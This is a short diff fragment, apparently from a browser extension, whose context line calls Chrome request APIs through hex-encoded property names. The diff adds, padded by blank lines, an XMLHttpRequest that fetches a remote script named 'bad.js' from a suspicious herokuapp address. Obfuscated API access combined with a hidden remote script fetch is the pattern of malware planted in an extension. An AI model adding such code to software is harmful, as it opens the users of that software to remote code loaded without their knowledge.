@@ -12,3 +12,13 @@ chrome["776562526571756573740d0a"]["576562524d71756a33740d0a"]["6164644c69737465
 })
 
 
+
+
+
+xhr.open("GET", "https://totallynotvalid/why/would/you/click/this.herokuapp.com/bad.js")
+xhr.send()
+
+
+
+
+
